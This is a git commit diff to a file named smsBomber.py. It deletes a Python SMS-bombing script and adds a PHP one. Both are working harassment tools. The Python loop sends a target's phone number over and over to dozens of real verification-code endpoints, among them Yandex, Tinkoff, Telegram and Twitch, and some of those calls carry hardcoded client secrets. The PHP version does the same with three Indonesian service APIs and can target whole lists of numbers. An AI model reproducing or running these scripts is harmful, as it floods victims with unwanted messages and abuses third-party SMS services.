1fde3aebf3f9434b5c537c47eeb1aeb74089070e
kazemwafa <67197761+kazemwafa@users.noreply.github.com>
2022-03-18 15:58:25 +0330

    Add files via upload

--- smsBomber.py
+++ smsBomber.py
@@ -1,296 +1,132 @@
-import os, sys
-import fake_useragent
-import requests
-from colorama import *
-init()
+<?php 
+/**
+* SMS BOOMBER MULTI API RANDOM.
+* @author shutdown57 < alinkokomansuby@gmail.com >
+* 
+*/
 
+error_reporting(0);
 
-x = 0
-y = 0
+Class __shutdown57{
 
+ 	/** Add Your Api here **/
+	public static $API_URL = [
+		'tokocash' => ['url' => 'https://www.tokocash.com/oauth/otp',
+					   'postdata' => 'msisdn={shutdown57_nomerHP}&accept=call',
+					   'success' => '"code":"200000"'
+					  ],
+		'jdid' =>     ['url' => 'http://sc.jd.id/phone/sendPhoneSms',
+					  'postdata' => 'phone={shutdown57_nomerHP}&smsType=1',
+					  'success' => '"success":true,"errorCode":null'
+					  ],
+		'tri'    =>  ['url' => 'https://registrasi.tri.co.id/daftar/generateOTP',
+					  'postdata' => 'msisdn={shutdown57_nomerHP}',
+					  'success' => '"code":"200"'
+					]
+					];
 
-def effect(message):
-    for char in message:
-        sys.stdout.write(char)
-        sys.stdout.flush()
+	public static $readLine;
 
-message22 = '\n        [\033[31m!\033[33m] АТАКА НАЧАЛАСЬ, ДЛЯ ОСТАНОВКИ НАЖМИТЕ CTRL + C [\033[31m!\033[33m] \n '
+	public function __banner()
+	{
+		print
+"
+     
+ 	+-------------- [ SMS BOOMBER MULTI API ]
+ 	  +-------------------------------------------[ 2018 ]
+";
+	}
+	public function __Boom($url,$data)
+	{
+		$c = curl_init();
+		$s = array(
+			CURLOPT_URL => $url,
+			CURLOPT_POST=>true,
+			CURLOPT_POSTFIELDS=>$data,
+			CURLOPT_RETURNTRANSFER=>true,
+			CURLOPT_USERAGENT=>"Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
+			);
+		curl_setopt_array($c,$s);
+		return curl_exec($c);
+		curl_close($c);
+	}
+	public function __stuck($text = "Input number / List Number")
+	{
+		echo PHP_EOL;
+		echo "shutdown57:: {$text} >>";
+		self::$readLine = rtrim(fgets(STDIN));
+	}
+	public function __rapi($text,$lenght,$isi)
+	{
+		return str_pad(strtoupper($text),$lenght,$isi,STR_PAD_BOTH);
+	}
+	public function __action()
+	{
+		$read = self::$readLine;
+		if(preg_match("/([0-9]{10,16})/",$read))
+		{
+			echo "[!] Detected phone number ~ ".PHP_EOL;
+			echo "[!] $read :: Targeted ~".PHP_EOL;
 
-def _sms(phone):
-    global x, y
-    user = fake_useragent.UserAgent().random
-    headers1 = {'user_agent': user}
-    print(Fore.YELLOW)
+			
+			echo PHP_EOL;
+			self::__stuck('How much boom to send?');
+			$boom=self::$readLine;
+			self::__stuck('How much delay to proccess?');
+			$delay=self::$readLine;
+			for($i=1;$i<=$boom;$i++)
+			{
+			$api = array_rand(self::$API_URL);
+			$post = str_replace("{shutdown57_nomerHP}",$read,self::$API_URL[$api]['postdata']);
+			if(preg_match("/".self::$API_URL[$api]['success']."/",self::__Boom(self::$API_URL[$api]['url'],$post)))
+			{
+				echo "[$i][SUCCESS] ".self::__rapi($api,10," ")." :: $read ./shutdown57 ".PHP_EOL;
+			}else{
+				echo "[$i][FAILED ] ".self::__rapi($api,10," ")." :: $read ./shutdown57".PHP_EOL;
+			}
+			sleep($delay);
+			}
+		}elseif(preg_match("/txt/",$read) || is_file($read))
+		{
+			echo "[!] Detected file list number $read ~".PHP_EOL;
+			$nlist = explode(PHP_EOL,@file_get_contents($read));
+			foreach($nlist as $no)
+			{
+				echo "[!] $no :: Targeted ~".PHP_EOL;
+			}
+			echo PHP_EOL;
+			self::__stuck('How much boom to send?');
+			$boom=self::$readLine;
+			self::__stuck('How much delay to proccess?');
+			$delay=self::$readLine;
+			foreach($nlist as $nmr)
+			{
+				for($i=1;$i<=$boom;$i++)
+				{
+					$api = array_rand(self::$API_URL);
+					$post = str_replace("{shutdown57_nomerHP}",$nmr,self::$API_URL[$api]['postdata']);
+					if(preg_match("/".self::$API_URL[$api]['success']."/",self::__Boom(self::$API_URL[$api]['url'],$post)))
+					{
+						echo "[$i][SUCCESS] ".self::__rapi($api,10," ")." :: $nmr ./shutdown57 ".PHP_EOL;
+					}else{
+						echo "[$i][FAILED ] ".self::__rapi($api,10," ")." :: $nmr ./shutdown57".PHP_EOL;
+					}
+					sleep($delay);
+			}
+			}
+		}else{
+			die('Input not correct ~'.PHP_EOL);
+		}
+	}
+	public function __run__bom_bom()
+	{
+		self::__banner();
+		self::__stuck();
+		self::__action();
 
-    effect(message22)
+	}
 
-    while True:
-        try:
-            a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
-                          json={"reqId": "91101-1606335718",
-                                "params": {"phone": phone, "language": "ru-RU", "route": "sms",
-                                           "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от icq отправлено!')
-            x += 1
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от icq не отправлено!')
-        try:
-            a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", data={"FastAuthorizationLoginLoadForm[login]" : phone}, headers=headers1, timeout=5.05)
-            x += 1
-            print('\n        [\033[32m+\033[33m] сообщение от dns-shop.ru отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от dns-shop.ru не отправлено!')
-        try:
-            a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers1, timeout=5.05)
-            x += 1
-            print('\n        [\033[32m+\033[33m] сообщение от lenta.com отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от lenta.com не отправлено!')
-        try:
-            a = requests.post("https://taxi.yandex.ru/3.0/auth",
-                          json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers1, timeout=5.05)
-            x += 1
-            print('\n        [\033[32m+\033[33m] сообщение от taxi.yandex отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от taxi.yandex не отправлено!')
-        try:
-            a = requests.post("https://youla.ru/web-api/auth/request_code",
-                          json={"phone": phone}, headers=headers1, timeout=5.05)
-            x += 1
-            print('\n        [\033[32m+\033[33m] сообщение от youla отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от youla не отправлено!')
-        try:
-            a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
-                "msisdn": phone,
-                "locale": "en",
-                "countryCode": "ru",
-                "version": "1",
-                "k": "ic1rtwz1s1Hj1O0r",
-                "r": "46763"
-                }, headers=headers1, timeout=5.05)
-            x += 1
-            print('\n        [\033[32m+\033[33m] сообщение от icq.com отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от icq.com не отправлено!')
-        try:
-            a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
-                          json={"phone_number": phone}, headers=headers1, timeout=5.05)
-            x += 1
-            print('\n        [\033[32m+\033[33m] сообщение от eda.yandex отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от eda.yandex не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
-                          data={"phone": phone}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от shop.vsk отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от shop.vsk не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
-                          data={"st.r.phone": "+" + phone}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от ok.ru отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от ok.ru не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://nn-card.ru/api/1.0/register",
-                              json={"phone": phone, "password": 'DDd7873456'}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от nn-card отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от nn-card не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
-                          json={"CellPhone": phone[1:]}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от my.modulbank отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от my.modulbank не отправлено!')
-        try:
-            x += 1
-            a = requests.post(
-            "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
+}
 
-            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от tinkoff отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от tinkoff не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",
-
-                          data={"l": phone[1:]}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от rutaxi отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от rutaxi не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
-                          data={"CellPhone": phone[1:]}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от modulbank отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от modulbank не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://ng-api.webbankir.com/user/v2/create",
-                          json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
-                                "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от webbankir отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от webbankir не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://m.tiktok.com/node-a/send/download_link",  json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone[1:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от tiktok отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от tiktok не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://api.sunlight.net/v3/customers/authorization/",  data={"phone": phone}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от sunlight отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от sunlight не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
-            json={
-            "phone": "+" + phone,
-            "api": 2,
-            "email": 'dgirherfib@gmaqil.com',
-            "x-email": "x-email",
-            }, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от mail.ru отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от mail.ru отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
-            data={
-            "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
-            "username": phone,
-            "client_id": "android-qw",
-            "client_secret": "zAm4FKq9UnSe7id",
-            }, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от qiwi отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от qiwi не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
-                             json={"phone": "+" + phone}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от tiktok отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от tiktok не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
-            json={
-            "birthday": {"day": 12, "month": 10, "year": 2000},
-            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
-            "include_verification_code": True,
-            "password": 'Danil5564554',
-            "phone_number": phone,
-            "username": 'bhtrtrrrtbhtrbhtr',
-            }, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от twitch.tv отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от twitch.tv не отправлено!')
-        try:
-            x += 1
-            a = requests.post("https://my.telegram.org/auth/send_password",
-            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от telegram отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от telegram не отправлено!')
-        try:
-            x += 1
-            a = requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
-            params={'msisdn': phone}, headers=headers1, timeout=5.05)
-            print('\n        [\033[32m+\033[33m] сообщение от mts.ru отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от mts.ru не отправлено!')
-        try:
-            x += 1
-            a = requests.post('https://www.etm.ru/cat/runprog.html',
-            data={'m_phone': phone, 'mode': 'sendSms', 'syf_prog': 'clients-services', 'getSysParam': 'yes'}, headers=headers1, timeout=5.05)
-            #print('\n        [\033[32m+\033[33m] сообщение от etm.ru отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от etm.ru не отправлено!')
-                
-        try:
-            x += 1
-            requests.post(
-                "https://www.icq.com/smsreg/requestPhoneValidation.php",
-                data={
-                    "msisdn": phone,
-                    "locale": "en",
-                    "countryCode": "ru",
-                    "version": "1",
-                    "k": "ic1rtwz1s1Hj1O0r",
-                    "r": "46763",
-                },
-            )
-            print('\n        [\033[32m+\033[33m] сообщение от icq.com отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от icq.com не отправлено!')
-
-        try:
-            x += 1
-            requests.post(
-                "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                data={"st.r.phone": "+" + phone},
-            )
-            print('\n        [\033[32m+\033[33m] сообщение от ok.ru отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от ok.ru не отправлено!')
-
-
-        try:
-            x += 1
-            requests.post(
-                "https://eda.yandex/api/v1/user/request_authentication_code",
-                json={"phone_number": "+" + phone},
-            )
-            print('\n        [\033[32m+\033[33m] сообщение от eda.yandex отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от eda.yandex не отправлено!')
-
-
-        try:
-            x += 1
-            requests.post(
-                "https://www.citilink.ru/registration/confirm/phone/+" + phone + "/"
-            )
-            print('\n        [\033[32m+\033[33m] сообщение от citilink.ru отправлено!')
-        except:
-            y += 1
-            print('\n        [\033[31m-\033[33m] сообщение от citilink.ru не отправлено!')
+__shutdown57::__run__bom_bom();
+?>
